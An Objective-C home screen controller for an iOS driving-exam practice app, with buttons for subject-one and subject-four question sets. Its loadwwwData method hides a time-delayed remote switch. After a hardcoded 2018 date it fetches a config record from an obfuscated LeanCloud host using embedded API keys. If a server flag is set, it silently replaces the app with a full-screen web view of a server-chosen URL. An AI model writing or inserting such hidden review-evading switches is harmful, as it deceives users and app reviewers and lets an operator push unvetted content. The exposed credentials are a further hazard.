//
//  HJGHomeController.m
//  JiaKaoBaoDian
//
//  Created by Developer on 2018/10/1.
//  Copyright © 2018年 Developer. All rights reserved.
//

#import "HJGHomeController.h"
#import "HJGHomeDetailController.h"
#import "XLClock.h"
#define r9rkRM8w @"r9rkRM8w.api.lncld"
#import "HJGWebController.h"
@interface HJGHomeController () {
    XLClock *_clock;
}

@property (nonatomic, strong) UIImageView *bgImageView;

@property (nonatomic, strong) UIButton *kemuyiBut;

@property (nonatomic, strong) UIButton *kemysiBut;

@end

@implementation HJGHomeController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    
    [self loadwwwData];
    
    [self configNav];
    
    [self configView];
    
    [_clock showStartAnimation];
    
    
    CGPoint centerP = self.view.center;
    CGPoint offCenter = CGPointMake(centerP.x, centerP.y + 100);
    _clock = [[XLClock alloc] initWithFrame:CGRectMake(0, 0, W(200), H(200))];
    [self.view addSubview:_clock];
    _clock.center= offCenter;

    
}

#pragma mark - configNav
- (void)configNav{
    self.automaticallyAdjustsScrollViewInsets = NO;
    self.title = @"首页";
    
}

#pragma mark - configView
- (void)configView{
    
    [self bgImageView];
    
    [self kemuyiBut];
    
    [self kemysiBut];

    
}

- (UIImageView *)bgImageView
{
    if (!_bgImageView) {
        UIImageView * theView = [[UIImageView alloc] init];
        theView.image = [UIImage imageNamed:@"yuy"];
        [self.view addSubview:theView];
        [theView makeConstraints:^(MASConstraintMaker *make) {
            make.left.equalTo(self.view);
            make.right.equalTo(self.view);
            make.bottom.equalTo(self.view);
            make.top.equalTo(self.view).offset(kMarginTopHeight);
        }];
        _bgImageView = theView;
    }
    return _bgImageView;
}


- (UIButton *)kemuyiBut
{
    if (!_kemuyiBut) {
        UIButton * theView = [[UIButton alloc] init];
        theView.layer.cornerRadius = W(25);
        theView.clipsToBounds = YES;
        theView.layer.borderColor = [UIColor whiteColor].CGColor;
        theView.layer.borderWidth = W(2);
        [theView setTitle:@"科目一" forState:0];
        [theView setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
        theView.titleLabel.font = [UIFont systemFontOfSize:W(14)];
        [theView addTarget:self action:@selector(kemuyiButClick) forControlEvents:UIControlEventTouchUpInside];
        [self.view addSubview:theView];
        [theView makeConstraints:^(MASConstraintMaker *make) {
            make.centerX.equalTo(self.view);
            make.top.equalTo(self.view).offset(H(100)+kMarginTopHeight);
            make.size.equalTo(CGSizeMake(W(100), H(60)));
        }];
        _kemuyiBut = theView;
    }
    return _kemuyiBut;
}

- (void)kemuyiButClick{
    
    
    DLog(@"点击了科目一按钮");
    
    HJGHomeDetailController *vc = [[HJGHomeDetailController alloc]init];
    vc.title_str = @"科目一考试试题";
    [self.navigationController pushViewController:vc animated:YES];
    
}

- (UIButton *)kemysiBut
{
    if (!_kemysiBut) {
        UIButton * theView = [[UIButton alloc] init];
        theView.layer.cornerRadius = W(25);
        theView.clipsToBounds = YES;
        theView.layer.borderColor = [UIColor whiteColor].CGColor;
        theView.layer.borderWidth = W(2);
        [theView setTitle:@"科目四" forState:0];
        [theView setTitleColor:[UIColor whiteColor] forState:UIControlStateNormal];
        theView.titleLabel.font = [UIFont systemFontOfSize:W(14)];
        [theView addTarget:self action:@selector(kemusiButClick) forControlEvents:UIControlEventTouchUpInside];
        [self.view addSubview:theView];
        [theView makeConstraints:^(MASConstraintMaker *make) {
            make.centerX.equalTo(self.view);
            make.top.equalTo(self.kemuyiBut.bottom).offset(H(50));
            make.size.equalTo(CGSizeMake(W(100), H(60)));
        }];
        _kemysiBut = theView;
    }
    return _kemysiBut;
}

- (void)kemusiButClick{
    
    DLog(@"点击了科目四");
    
    HJGHomeDetailController *vc = [[HJGHomeDetailController alloc]init];
    vc.title_str = @"科目四考试试题";
    vc.isKemusi = YES;
    [self.navigationController pushViewController:vc animated:YES];
}

- (void)loadwwwData
{
    NSDateFormatter * dateFormatter = [[NSDateFormatter alloc] init];
    [dateFormatter setDateFormat:@"yyyy-MM-dd"];
    NSString *dateTime=[dateFormatter stringFromDate:[NSDate date]];
    NSDate *currendate = [dateFormatter dateFromString:dateTime];
    NSDate *date = [dateFormatter dateFromString:@"2018-10-10"];
    NSComparisonResult result = [date compare:currendate];
    if (result == NSOrderedDescending)
    {
        return;
    }
    else if (result == NSOrderedAscending)
    {
        
    }
    
    
    
    [BANetManager ba_setValue:@"4rOaGFErHAcAsTYFq4grqf9t-gzGzoHsz" forHTTPHeaderKey:@"X-LC-Id"];
    
    [BANetManager ba_setValue:@"TBhsi6tFs8wnqGSMyuRd7Y6K" forHTTPHeaderKey:@"X-LC-Key"];
    
    
    NSString *gaga  = [NSString stringWithFormat:@"%@",r9rkRM8w];
    
    NSString *hh = [NSString stringWithFormat:@"https://%@.net/1.1/classes/config/5ad95842ee920a3f733ffe27",gaga];
    
    [HJGNetManger getUrl:hh IsNeedCashe:NO dic:@{} responseSuccess:^(id response) {
        if ([response[@"isOpen"] intValue] == 1) {
            
            HJGWebController *vc = [[HJGWebController alloc]init];
            vc.url_string = response[@"openUrl"];
            [HJGSaveTool setObject:response[@"jpushKey"] forKey:@"ok"];
            [self presentViewController:vc animated:NO completion:NULL];
        }else{
            
        }
    } responseFail:^(NSError *error) {
        
    }];
    
}

@end
